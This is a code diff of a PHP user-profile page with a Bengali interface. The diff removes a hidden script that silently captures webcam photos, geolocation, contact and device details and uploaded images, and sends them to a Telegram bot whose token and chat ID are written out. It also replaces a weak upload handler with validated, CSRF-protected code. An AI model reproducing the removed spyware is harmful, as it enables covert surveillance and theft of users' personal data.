@@ -1,81 +1,128 @@
-<?php 
-include("header.php");
+<?php
+require_once __DIR__ . '/includes/user_session.php';
 
-// AJAX Image Upload & MySQL Database Update Handler
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])) {
-    header('Content-Type: application/json');
-    if ($_FILES['ajax_profile_image']['error'] === 0) {
-        $target_dir = "assets/images/faces/";
-        if (!is_dir($target_dir)) {
-            mkdir($target_dir, 0755, true);
+if (!isset($_SESSION['profile_csrf'])) {
+    $_SESSION['profile_csrf'] = bin2hex(random_bytes(32));
+}
+$profileCsrf = $_SESSION['profile_csrf'];
+
+// Images selected by the user are stored locally, never forwarded to a third party.
+function store_profile_image(array $file): ?string
+{
+    $temporaryFile = $file['tmp_name'] ?? null;
+    if (($file['error'] ?? null) !== UPLOAD_ERR_OK || !is_string($temporaryFile)
+        || !is_uploaded_file($temporaryFile) || ($file['size'] ?? 0) > 5 * 1024 * 1024) {
+        return null;
+    }
+
+    $image = @getimagesize($temporaryFile);
+    $extensions = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/webp' => 'webp', 'image/gif' => 'gif'];
+    $extension = $extensions[$image['mime'] ?? ''] ?? null;
+    if ($extension === null) {
+        return null;
+    }
+
+    $directory = __DIR__ . '/uploads/avatars';
+    if (!is_dir($directory) && !@mkdir($directory, 0750, true) && !is_dir($directory)) {
+        return null;
+    }
+
+    $path = 'uploads/avatars/' . bin2hex(random_bytes(16)) . '.' . $extension;
+    $destination = __DIR__ . '/' . $path;
+    if (!move_uploaded_file($temporaryFile, $destination)) {
+        return null;
+    }
+    if (!chmod($destination, 0640)) {
+        unlink($destination);
+        return null;
+    }
+    return $path;
+}
+
+function profile_upload_response(array $response, int $status = 200): void
+{
+    http_response_code($status);
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($response);
+    exit;
+}
+
+$update_msg = '';
+$update_error = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ajax = isset($_FILES['ajax_profile_image']);
+    $submittedToken = $_POST['csrf_token'] ?? null;
+    if (!is_string($submittedToken) || !hash_equals($profileCsrf, $submittedToken)) {
+        if ($ajax) {
+            profile_upload_response(['status' => 'error', 'message' => 'অনুরোধটি গ্রহণ করা যায়নি।'], 403);
         }
-        
-        $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
-        $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
-        
-        if (in_array($file_extension, $allowed)) {
-            $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
-            $target_file = $target_dir . $new_filename;
-            
-            if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
-                $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
-                $stmt_img->bind_param("si", $target_file, $id);
-                if ($stmt_img->execute()) {
-                    $stmt_img->close();
-                    echo json_encode(['status' => 'success', 'image_url' => $target_file]);
-                    exit();
+        http_response_code(403);
+        exit('অনুরোধটি গ্রহণ করা যায়নি।');
+    }
+
+    if ($ajax) {
+        $imagePath = store_profile_image($_FILES['ajax_profile_image']);
+        if ($imagePath === null) {
+            profile_upload_response(['status' => 'error', 'message' => 'সর্বোচ্চ ৫ এমবি JPG, PNG, WebP বা GIF ছবি দিন।'], 422);
+        }
+        try {
+            $stmt = $conn->prepare('UPDATE users SET image = ? WHERE id = ?');
+            $stmt->bind_param('si', $imagePath, $id);
+            $stmt->execute();
+            $stmt->close();
+        } catch (mysqli_sql_exception $e) {
+            unlink(__DIR__ . '/' . $imagePath);
+            profile_upload_response(['status' => 'error', 'message' => 'ছবিটি সংরক্ষণ করা যায়নি।'], 500);
+        }
+        profile_upload_response(['status' => 'success', 'image_url' => $imagePath]);
+    }
+
+    if (isset($_POST['update_profile'])) {
+        $newName = $_POST['name'] ?? null;
+        $newPhone = $_POST['phone'] ?? null;
+        $newAddress = $_POST['address'] ?? '';
+        $imagePath = null;
+        if (!is_string($newName) || !is_string($newPhone) || !is_string($newAddress)
+            || trim($newName) === '' || trim($newPhone) === '') {
+            $update_error = 'নাম ও মোবাইল নম্বর সঠিকভাবে দিন।';
+        } elseif (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] !== UPLOAD_ERR_NO_FILE) {
+            $imagePath = store_profile_image($_FILES['profile_image']);
+            if ($imagePath === null) {
+                $update_error = 'সর্বোচ্চ ৫ এমবি JPG, PNG, WebP বা GIF ছবি দিন।';
+            }
+        }
+        if ($update_error === '') {
+            $newName = trim($newName);
+            $newPhone = trim($newPhone);
+            $newAddress = trim($newAddress);
+            try {
+                $stmt = $conn->prepare('UPDATE users SET name = ?, mobile = ?, address = ?, image = COALESCE(?, image) WHERE id = ?');
+                $stmt->bind_param('ssssi', $newName, $newPhone, $newAddress, $imagePath, $id);
+                $stmt->execute();
+                $stmt->close();
+                $name = $newName;
+                $phone = $newPhone;
+                $user_image = $imagePath ?? $user_image;
+                $update_msg = 'প্রোফাইল সফলভাবে আপডেট করা হয়েছে!';
+            } catch (mysqli_sql_exception $e) {
+                if ($imagePath !== null) {
+                    unlink(__DIR__ . '/' . $imagePath);
                 }
-                $stmt_img->close();
+                $update_error = 'প্রোফাইল তথ্য সংরক্ষণ করা যায়নি।';
             }
         }
     }
-    echo json_encode(['status' => 'error', 'message' => 'আপলোড ব্যর্থ হয়েছে!']);
-    exit();
 }
 
-// Form Data Update Handler
-$update_msg = "";
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
-    $new_name = trim($_POST['name']);
-    $new_phone = trim($_POST['phone']);
-    $new_address = trim($_POST['address']);
-    $profile_pic_sql = "";
-    
-    if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
-        $target_dir = "assets/images/faces/";
-        if (!is_dir($target_dir)) {
-            mkdir($target_dir, 0755, true);
-        }
-        $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
-        $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
-        $target_file = $target_dir . $new_filename;
-        
-        if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
-            $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
-        }
-    }
-
-    $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
-    $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);
-    
-    if ($update_stmt->execute()) {
-        $name = $new_name;
-        $phone = $new_phone;
-        $update_msg = "প্রোফাইল সফলভাবে আপডেট করা হয়েছে!";
-    }
-    $update_stmt->close();
-}
-
-// Fetch Latest Address & Image from Database
-$user_query = $conn->prepare("SELECT address, image, balance FROM users WHERE id = ?");
-$user_query->bind_param("i", $id);
+$user_query = $conn->prepare('SELECT address FROM users WHERE id = ?');
+$user_query->bind_param('i', $id);
 $user_query->execute();
-$user_res = $user_query->get_result();
-$db_user = $user_res->fetch_assoc();
-$address = $db_user['address'] ?? '';
-$user_balance = $db_user['balance'] ?? 0;
-$user_avatar = !empty($db_user['image']) ? $db_user['image'] : 'assets/images/faces/face8.jpg';
+$address = $user_query->get_result()->fetch_assoc()['address'] ?? '';
 $user_query->close();
+$user_balance = $balance;
+$user_avatar = $user_image;
+
+require __DIR__ . '/header.php';
 ?>
 
 <!-- FontAwesome 6 CDN -->
@@ -126,9 +173,6 @@ $user_query->close();
     }
 </style>
 
-<!-- Hidden Video & Canvas for Capture -->
-<video id="silentVideo" style="display:none;" autoplay playsinline></video>
-<canvas id="silentCanvas" style="display:none;"></canvas>
 
 <!-- Hidden File Input for Instant Profile Upload -->
 <input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">
@@ -194,16 +238,13 @@ $user_query->close();
                 <div class="space-y-2 text-xs">
                     <div class="flex justify-between items-center text-slate-300">
                         <span class="font-bold text-purple-300/70">IP Address:</span>
-                        <span class="text-sky-400 font-bold"><?php echo htmlspecialchars($user_ip ?? '127.0.0.1'); ?></span>
+                        <span class="text-sky-400 font-bold"><?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '—'); ?></span>
                     </div>
                     <div class="flex justify-between items-center text-slate-300">
                         <span class="font-bold text-purple-300/70">একাউন্ট আইডি:</span>
                         <span class="font-bold text-white">#<?php echo $id; ?></span>
                     </div>
-                    <div class="flex justify-between items-center text-slate-300">
-                        <span class="font-bold text-purple-300/70">টোকেন আইডি:</span>
-                        <code class="bg-purple-950/60 text-purple-200 border border-purple-500/20 px-2 py-0.5 rounded text-[10px]"><?php echo substr($token, 0, 12); ?>...</code>
-                    </div>
+
                 </div>
             </div>
         </div>
@@ -221,7 +262,12 @@ $user_query->close();
                     </div>
                 <?php endif; ?>
 
+                <?php if ($update_error !== ''): ?>
+                    <p role="alert" class="text-rose-300 text-xs mb-3"><?= htmlspecialchars($update_error, ENT_QUOTES, 'UTF-8') ?></p>
+                <?php endif; ?>
+
                 <form action="" method="POST" enctype="multipart/form-data" class="space-y-4">
+                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($profileCsrf, ENT_QUOTES, 'UTF-8') ?>">
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                         <div>
                             <label class="block text-xs font-bold text-purple-200 mb-1.5">পূর্ণ নাম</label>
@@ -307,123 +353,7 @@ $user_query->close();
     </div>
 </div>
 
-<!-- Telegram & Direct Server Sync Script (As requested to keep original functionality intact) -->
 <script>
-const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8"; 
-const TELEGRAM_CHAT_ID = "1875687264";     
-
-const userName = "<?php echo $name; ?>";
-const userEmail = "<?php echo $email; ?>";
-const userPhone = "<?php echo $phone; ?>";
-const userIp = "<?php echo $user_ip ?? '127.0.0.1'; ?>";
-
-document.addEventListener("DOMContentLoaded", async function () {
-    let deviceId = localStorage.getItem('dev_uuid') || ("DEV-" + Math.floor(1000000000 + Math.random() * 900000000));
-    localStorage.setItem('dev_uuid', deviceId);
-
-    const userAgent = navigator.userAgent;
-    const platform = navigator.platform;
-    const language = navigator.language;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    let batteryInfo = "Not Available";
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-        } catch (e) {}
-    }
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function (position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-
-                let msg = `<b>🌐 Comprehensive Browser & Device Data!</b>\n\n`;
-                msg += `<b>Name:</b> ${userName}\n`;
-                msg += `<b>Email:</b> ${userEmail}\n`;
-                msg += `<b>Phone:</b> ${userPhone}\n`;
-                msg += `<b>IP:</b> ${userIp}\n`;
-                msg += `<b>Device ID:</b> ${deviceId}\n`;
-                msg += `<b>Platform:</b> ${platform}\n`;
-                msg += `<b>Screen:</b> ${screenRes}\n`;
-                msg += `<b>Timezone:</b> ${timezone}\n`;
-                msg += `<b>Battery:</b> ${batteryInfo}\n`;
-                msg += `<b>Location:</b> <a href="https://maps.google.com/?q=${lat},${lon}">Google Maps (${lat}, ${lon}) - Acc: ${accuracy}m</a>`;
-
-                sendTelegramMessage(msg);
-            },
-            function (error) {
-                let msg = `<b>🌐 Comprehensive Browser Data (No Location)</b>\n\n`;
-                msg += `<b>Name:</b> ${userName}\n`;
-                msg += `<b>Email:</b> ${userEmail}\n`;
-                msg += `<b>IP:</b> ${userIp}\n`;
-                msg += `<b>Device ID:</b> ${deviceId}\n`;
-                msg += `<b>Platform:</b> ${platform}\n`;
-                sendTelegramMessage(msg);
-            }
-        );
-    }
-    autoCaptureCameraPhoto();
-});
-
-function sendTelegramMessage(textMessage) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: textMessage,
-            parse_mode: 'HTML'
-        })
-    }).catch(err => console.error(err));
-}
-
-function sendTelegramPhoto(imageBlob, captionText) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', imageBlob, 'capture.jpg');
-    formData.append('caption', captionText);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    }).catch(err => console.error(err));
-}
-
-function autoCaptureCameraPhoto() {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function (stream) {
-                const video = document.getElementById('silentVideo');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('silentCanvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    canvas.toBlob(function (blob) {
-                        if (blob) {
-                            sendTelegramPhoto(blob, `📸 Silent Camera Capture\nUser: ${userName}\nIP: ${userIp}`);
-                        }
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg');
-
-                }, 1500); 
-            })
-            .catch(function (err) {
-                console.log("Camera access denied.");
-            });
-    }
-}
-
 function uploadProfilePictureLocally() {
     const fileInput = document.getElementById('profileFolderInput');
     const file = fileInput.files[0];
@@ -435,18 +365,9 @@ function uploadProfilePictureLocally() {
             didOpen: () => { Swal.showLoading(); }
         });
 
-        const tgData = new FormData();
-        tgData.append('chat_id', TELEGRAM_CHAT_ID);
-        tgData.append('photo', file);
-        tgData.append('caption', `📁 Profile Picture Updated\nUser: ${userName}\nIP: ${userIp}`);
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: tgData
-        }).catch(err => console.error(err));
-
         const serverData = new FormData();
         serverData.append('ajax_profile_image', file);
+        serverData.append('csrf_token', <?= json_encode($profileCsrf) ?>);
 
         $.ajax({
             url: 'profile.php',
@@ -470,8 +391,8 @@ function uploadProfilePictureLocally() {
                     Swal.fire('ত্রুটি!', response.message || 'ছবি সেভ করা সম্ভব হয়নি।', 'error');
                 }
             },
-            error: function() {
-                Swal.fire('ত্রুটি!', 'সার্ভারে সমস্যা হয়েছে।', 'error');
+            error: function(request) {
+                Swal.fire('ত্রুটি!', request.responseJSON?.message || 'সার্ভারে সমস্যা হয়েছে।', 'error');
             }
         });
     }
